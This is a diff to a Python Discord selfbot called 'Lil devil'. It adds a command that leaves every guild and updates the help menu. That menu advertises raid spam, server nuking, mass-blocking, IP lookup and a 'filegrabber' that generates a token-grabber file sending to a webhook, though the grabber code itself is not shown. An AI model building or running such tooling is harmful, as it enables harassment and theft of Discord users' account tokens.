@@ -2,6 +2,7 @@ try:
     import time
     import os
     import platform
+    
     osname = platform.system()
     purple = "\033[95m"
     reset = "\033[0m"
@@ -27,13 +28,14 @@ try:
     import asyncio
     from discord import Forbidden
     import requests
+    import keyboard
     import string
     import random
     import aiohttp
     import io
     import pystyle
     import json
-
+    import sys
 
     """
     If you want to install all these packages here you go:
@@ -61,7 +63,7 @@ try:
     PREFIX = ">"
     #put yo token over here lol
     TOKEN = config['TOKEN'] #input token here
-
+    
 
 
     pystyle.System.Title("Lil devil selfbot By ELDIABLO")
@@ -153,6 +155,7 @@ try:
 
 
 
+
     @bot.command(aliases=["pornhubcomment", 'phc'])
     async def phcomment(ctx, user: str = None, *, args=None):
         await ctx.message.add_reaction('✅')
@@ -210,6 +213,9 @@ try:
         print(f'{ctx.message.author.name} sent the command: {ctx.message.content}')
         await bot.change_presence(activity=None)
         os._exit(0)
+
+
+ 
 
     @bot.command()
     async def info(ctx, user: discord.User):
@@ -444,12 +450,16 @@ try:
         await ctx.guild.edit(name=name)
         print(f'{ctx.message.author.name} sent the command: {ctx.message.content}')
 
+
+
+
+
     @bot.command()
     async def help(ctx):
         await ctx.message.add_reaction('✅')
         message = await ctx.send("```ini\n[Welcome to Little Devil selfbot created by el diablo, please stand by]\n```")
         await asyncio.sleep(1)  
-        new_message = f"```ini\nCreated by diablo | Version 2.5 | PREFIX = {PREFIX}\n \n[>raid]: >raid <message> <numberoftimes> <delay put 0> <specify channel if not then it will spam in all> (dont forget to remove the <>)\n[>info]: >info <userid> or <username>\n[>ping]: Returns your MS\n[>geocode]: >geocode <latitude> <longitude> (must be integers)\n[>exit]: Exits out of the selfbot\n[>iplookup]: >iplookup <ip>\n[>nitro]: self explanatory, generates nitro \n[>minesweeper]: play a game of minesweeper :D\n[>filegrabber (webhook)]: >filegrabber (put webhook url) all this does is make a token grabber py file\n[>nuke]: This time it requires admin\n[>hack]: >hack (user) this time its a fun command\n[>guildicon]: >self explanatory\n[>servername]: <name>\n[>massreact (emoji)]: >massreact (select the emoji you wana react with)\n[>purge]: >purge (int)\n[>tableflip]: does the cool thing\n[>lenny]: another cool thing\n[>shrug]: ANOTHER COOL THING\n[>unflip]: wowww\n[>phcomment] >phcomment <username> <comment>\n[>rage]: >rage (userid) replies L to them everytime they say something in chat\n[>911]: send a 911 animation with emojis\n[>fuck]: <userid> sends an ascii of you fucking him lmfao\n[>clear]: clears the terminal screen so you wont get bothered [LOGGED MESSAGES GET DELETED!!!]\n[>gc]: this will make a gc: >gc maxnum, numoftimestomakeit, firstuser, seconduser\n[>block]: this will block all your friends```"
+        new_message = f"```ini\nCreated by diablo | Version 2.5 | PREFIX = {PREFIX}\n \n[>raid]: >raid <message> <numberoftimes> <delay put 0> <specify channel if not then it will spam in all> (dont forget to remove the <>)\n[>info]: >info <userid> or <username>\n[>ping]: Returns your MS\n[>geocode]: >geocode <latitude> <longitude> (must be integers)\n[>exit]: Exits out of the selfbot\n[>iplookup]: >iplookup <ip>\n[>nitro]: self explanatory, generates nitro \n[>minesweeper]: play a game of minesweeper :D\n[>filegrabber (webhook)]: >filegrabber (put webhook url) all this does is make a token grabber py file\n[>nuke]: This time it requires admin\n[>hack]: >hack (user) this time its a fun command\n[>guildicon]: >self explanatory\n[>servername]: <name>\n[>massreact (emoji)]: >massreact (select the emoji you wana react with)\n[>purge]: >purge (int)\n[>tableflip]: does the cool thing\n[>lenny]: another cool thing\n[>shrug]: ANOTHER COOL THING\n[>unflip]: wowww\n[>phcomment] >phcomment <username> <comment>\n[>rage]: >rage (userid) replies L to them everytime they say something in chat\n[>911]: send a 911 animation with emojis\n[>fuck]: <userid> sends an ascii of you fucking him lmfao\n[>clear]: clears the terminal screen so you wont get bothered [LOGGED MESSAGES GET DELETED!!!]\n[>gc]: this will make a gc: >gc [MAX] [NUMOFTIMES] [YOUR ALT'S ID] [TARGET'S ID]\n[>block]: this will block all your friends\n[>guildleave]: leaves all your guilds```"
         await message.edit(content=new_message)
         print(f'{ctx.message.author.name} sent the command: {ctx.message.content}')
 
@@ -660,6 +670,17 @@ try:
         print(f'{ctx.message.author.name} sent the command: {ctx.message.content}')
 
 
+
+    @bot.command()
+    async def guildleave(ctx):
+        await ctx.message.add_reaction('✅')
+        time.sleep(0.3)
+        await ctx.message.delete()
+        print(f'{ctx.message.author.name} sent the commmand: {ctx.message.content}')
+        for guild in bot.guilds:
+            await bot.leave_guild(guild)
+
+
     @bot.command()
     async def block(ctx):
         await ctx.message.add_reaction('✅')
@@ -702,10 +723,10 @@ try:
     async def guildicon(ctx):
         await ctx.message.add_reaction('✅')
         await ctx.message.delete()
-        if not ctx.guild.icon_url:
+        if not ctx.guild.icon.url:
             await ctx.send(f"**{ctx.guild.name}** has no icon")
             return
-        await ctx.send(ctx.guild.icon_url)
+        await ctx.send(ctx.guild.icon.url)
         print(f'{ctx.message.author.name} sent the command: {ctx.message.content}')
 
     @bot.command()
@@ -725,7 +746,7 @@ try:
                 except Exception as e:
                     print(f"Failed to delete message: {e}")
 
-        
+
 
     @bot.command(aliases=["9/11", "911", "terrorist"])
     async def nine_eleven(ctx):
